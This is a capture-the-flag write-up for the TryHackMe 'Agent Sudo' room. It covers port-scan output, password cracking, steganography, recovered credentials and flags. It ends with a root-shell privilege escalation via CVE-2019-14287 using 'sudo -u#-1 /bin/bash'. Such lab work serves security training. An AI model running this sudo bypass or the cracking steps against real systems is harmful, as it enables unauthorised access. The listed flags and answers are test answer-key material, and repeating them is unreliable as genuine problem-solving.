# Agent Sudo 

## Enumerate

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/gabriel/snap/rustscan/28/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.232.253:21
Open 10.10.232.253:22
Open 10.10.232.253:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] 
Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-09 21:46 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Initiating Ping Scan at 21:46
Scanning 10.10.232.253 [2 ports]
Completed Ping Scan at 21:46, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:46
Completed Parallel DNS resolution of 1 host. at 21:46, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:46
Scanning 10.10.232.253 [3 ports]
Discovered open port 21/tcp on 10.10.232.253
Discovered open port 80/tcp on 10.10.232.253
Discovered open port 22/tcp on 10.10.232.253
Completed Connect Scan at 21:46, 0.04s elapsed (3 total ports)
Initiating Service scan at 21:46
Scanning 3 services on 10.10.232.253
Completed Service scan at 21:46, 6.09s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.232.253.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 2.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Nmap scan report for 10.10.232.253
Host is up, received syn-ack (0.034s latency).
Scanned at 2021-04-09 21:46:46 BST for 10s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Read data files from: /snap/rustscan/28/usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds
```
```
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
```

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

```

**Questions**

    1. How many open ports?

3

    2. How do you redirect yourself to a secret page

user-agent

    3. What is the agent name?

chris

## Hash Cracking And Brute-Force

    1. FTP password

crystal

    2. ZIP password

alien

Found by using `strings` and `binwalk` on the `alien.jpg`. Then by using `zip2john` and `john` to crack the password.

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

    3. Steg password?

Area51

(Found by `echo QXJlYTUx | base64 -d`)

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
    
    4. Who is the other agent (in full name)?

James

    5. SSH password

hackerrules!

## Capture The User Flag

    1. What is the user flag?

b03d975e8c92a7c04146cfa7a5a313c7

    2. What is the incident of the photo called?

Roswell alien autopsy

## Privilege Escalation

    1. CVE number for the escalation?

CVE-2019-14287

```bash
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# 
```
    2. What is the root flag?

b53a02f55b57d4439e3341834d70c062

    3. (Bonus) Who is Agent R?

DesKel